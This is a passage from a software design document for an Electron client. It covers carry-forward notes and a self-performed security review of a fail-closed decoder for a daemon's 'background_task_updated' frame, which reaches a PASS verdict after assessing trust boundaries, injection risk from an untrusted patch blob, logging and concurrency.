  `BackgroundTaskUpdatedPayload`, this decoder tolerates-but-drops it until the slice is widened — the
  correct no-drift posture for a wire type (CLAUDE.md § Wire protocol).
- **Carry-forward for #567 / #568, not this slice's work:** (a) `patch` is an opaque display blob that is
  **not guaranteed to parse** — any key reading must sit behind an error branch falling back to inert text,
  and must never enumerate a closed key set; (b) `patch` is untrusted, model-influenced text whose keys may
  carry command text — inert text rendering only, never an HTML/attribute/URL sink, never executed or
  re-shelled; (c) `truncatedFields` must survive into the held set, and reports the **cap cut only**, so
  `patch` may differ from claude's bytes without appearing there; (d) the `task_id` join to
  `background_task_started` is #567's, and it must tolerate an `updated` for a task it never saw opened,
  since ordering is claude's; (e) there is **no terminal event** in this family by design, so "finished" is a
  client conclusion drawn from absence in a later roster, never something the wire reports.

## Security review

**Verdict:** PASS

This slice receives an untrusted daemon `background_task_updated` frame (hostile-daemon threat), fail-closed
decodes it, and emits an event carrying **two identifiers, one opaque blob, and a list of strings** across
the main→renderer IPC boundary. Versus its sibling #564 this is a **narrowing** in field count but not in
hazard class: the daemon's own doc states the render-never-execute rule in *this* frame's section rather than
delegating it to the sibling, on the explicit grounds that a patch's structured shape makes it *the more
tempting thing to feed somewhere that runs it*. The categories are walked against that specific temptation.

**Findings:**

1. **[Trust boundaries]** No finding. One explicit boundary: `parseInboundMessage`'s
   `case 'background_task_updated'` → `parseBackgroundTaskUpdatedPayload`, a single named fail-closed
   narrower — not scattered parsing. It returns a fresh four-field literal, never a spread of the incoming
   `payload`, so a hostile `__proto__` / `constructor` key cannot pollute (prototype-pollution-safe by
   construction, mirroring the vetted sibling). `requireStringArrayOrNull` likewise returns a fresh array
   rather than the wire array, so array-borne extra properties cannot ride along. The emit is a fresh
   named-field literal, so exactly four validated values cross IPC and a later-added decoder field cannot
   smuggle itself across. Downstream holds a discriminated-union arm, so the type system signals what is
   held. The event flows main→renderer only; no new renderer→main channel is added.

2. **[Tokens, secrets, credentials]** N/A — no token, secret, credential, or key is generated, stored, read,
   rotated, or compared. `conversation_id` and `task_id` are routing / correlation identifiers, not secrets.
   Thrown `WireDecodeError` messages name the failure **category and field name** only, never interpolating a
   value — which matters here because a value interpolation would put patch text, potentially containing
   command text, into an error string that a crash reporter would capture.

3. **[File / storage operations]** N/A — no filesystem, disk, cache, or web-storage operation. Nothing is
   persisted, so path-traversal, TOCTOU, atomic-write and encryption-at-rest questions do not arise.
   Explicitly noted because a patch key may contain paths: no decoded value is concatenated into a path,
   opened, or written anywhere in this slice, and #567 holds it in memory only.

4. **[Inter-process / Electron attack surface]** No finding. No new `BrowserWindow`, `webPreferences`,
   `contextBridge` API, `ipcMain.handle`, or `ipcMain.on` channel — the event rides the existing
   `emitDaemonEvent` → IPC path. All four values are validated **before** they cross (typed at the narrower,
   re-copied by name at the emit): main validates, then hands the renderer an already-narrowed value.
   `string` and `string[]` are structured-clone-safe, so there is no deserialization surface on the renderer
   side. Process placement is preserved per CLAUDE.md — decode, socket, and Noise stay in main; the renderer
   receives only the typed event.

5. **[Cryptographic primitives]** N/A — no RNG, key, nonce, Noise, or compare-against-a-secret work. The
   slice reuses exactly one vetted primitive, the content-free `hashPlaintext` diagnostic helper (#130),
   unchanged.

6. **[Injection / untrusted text — the real finding, and how it is discharged]** `patch` is claude's patch
   object carried whole and unparsed. The daemon bounds it (`maxTaskPatch`) and scrubs invalid UTF-8, but
   does not sanitize its content; a patch key may carry command text exactly as the sibling's `description`
   does. The daemon's golden fixture is itself adversarial — `{"is_backgrounded":tr`, cut mid-token, so any
   consumer that assumed it parses fails on the *canonical* input.

   **Classification: no exploitable sink exists in this slice, and the constraint is carried forward
   explicitly rather than assumed.** This slice has **zero** DOM sinks, zero shell invocations, zero URL
   construction, zero attribute assignment, and — decisively for this frame — **zero `JSON.parse` on
   `patch`**. It decodes to a typed value and emits it. React escapes text children, so the eventual #568
   render is inert *by default*; the dangerous shapes are `dangerouslySetInnerHTML`, an
   attribute/`href`/`src` sink, and the temptation unique to this frame — parsing the blob and then treating
   a resulting key's value as actionable. None exists yet, and none may be introduced without a
   security-sensitive ticket of its own.

   The discharge is fourfold, all mandated above rather than left to reviewer memory: (a) the
   `BackgroundTaskUpdatedPayload` doc-comment (§ Design 1) carries the daemon's SECURITY paragraph in
   substance plus the three independent do-not-parse reasons; (b) the `DaemonEvent` arm doc-comment
   (§ Design 3) repeats the inherited constraint at the type the renderer actually imports; (c) the
   round-trip test asserts `patch` crosses byte-for-byte with the *invalid-JSON* canonical value, so a future
   parse-and-normalize change fails a test rather than passing silently; (d) the constraint is restated as a
   named carry-forward to #567 and #568 under § Open questions.

   **Rejected mitigation — parsing, validating, or sanitizing `patch` at the decoder.** Parsing it would fail
   on the daemon's own canonical fixture (it is truncated by design), turning a valid frame into a dropped
   one — a self-inflicted denial of the exact signal #1240 needs. Enumerating its keys would silently discard
   every key claude ships next, which the daemon explicitly refuses to do for that reason. Stripping
   metacharacters would corrupt a display blob and present altered text as claude's. Narrowing
   `truncated_fields` to the two known names would fail-close a valid future frame — and this frame's pair
   (`task_id`, `patch`) already *differs* from the sibling's four, which is the concrete proof the vocabulary
   moves. All are the wrong layer: the defence belongs at the sink, and the sink does not exist yet.

7. **[Error messages, logs, telemetry]** No finding. The diagnostic reuses the existing content-free field
   set (`event` / `code: 'background_task_updated'` / `bytes` / `hash`) with **no new `DiagnosticEvent`
   field**, so #131's renderer pin is untouched, and **no decoded field is logged** — least of all `patch`,
   which would write model-influenced, possibly command-bearing text into the diagnostic log. § Design 2d
   forbids adding one explicitly, and a dedicated test asserts a sentinel `patch` and `conversation_id` are
   absent from the record and that the record's key set is exactly the existing one. The arm narrows
   **before** logging, so a malformed frame throws first and leaves no record (its own test). Thrown
   `WireDecodeError` messages carry the failure category and field *name* only — never a value — so a crash
   reporter or telemetry sink capturing the error object leaks no patch text. Nothing is piped to the
   renderer console.

8. **[Concurrency]** No finding, and the design is deliberately stateless. No async task, timer,
   subscription, listener, or shared mutable state is introduced; decode + emit is synchronous within the
   existing inbound dispatch, so there is no check-then-act race across an `await`, nothing to cancel on
   teardown, and no shutdown-safety question. Security-relevant inversion worth naming, and sharper here than
   in the sibling: this frame is *definitionally* an update to a prior one, so a developer is tempted to join
   it against the `background_task_started` set — which would introduce the only mutable state in the leg,
   **keyed by an attacker-influenceable `task_id`**, and would be an unbounded map fed directly by a hostile
   daemon's frame stream. Ordering is claude's, not the daemon's, so an `updated` for a never-opened task is
   legal and must not be buffered. The spec forbids the join (§ Non-goals, § State model) and a round-trip
   test pins the never-opened-`task_id` case.

9. **[Threat model alignment]** Addressed. **Hostile daemon response** is the applicable threat: malformed,
   mistyped, or truncated fields → `WireDecodeError` → swallowed by the connection → frame dropped, no emit,
   no crash; an omitted `patch` or `truncated_fields` key fails closed rather than being read as empty or
   `null`; oversized frames are capped upstream by `MAX_PLAINTEXT_BYTES` before the narrower runs; hostile
   *content* in `patch` is handled per finding 6. **Malicious / compromised relay:** content-blind and unable
   to forge frames inside the Noise session; it can flood, but each frame decodes to a fixed-shape emit with
   **no accumulated state** (no growing list, no timer, no map keyed by attacker-controlled `task_id` — that
   map is #567's, and #567 owns its own bounding), so a flood costs CPU proportional to frames delivered and
   nothing more. Rate/framing posture is inherited from the relay connection, not introduced here.
   **Renderer compromise reaching the transport:** unchanged — this slice adds no renderer→main capability.
   **Token theft from disk:** N/A, nothing persisted. **OUT OF SCOPE and named:** all rendering, formatting,
   patch-key reading, and any client-side state derived from this event belong to #567 (store) and #568
   (panel); the sibling `background_task_roster` frame belongs to #566.

**Reviewer:** architect (self-review per `architect/security-review.md`)
**Date:** 2026-08-19
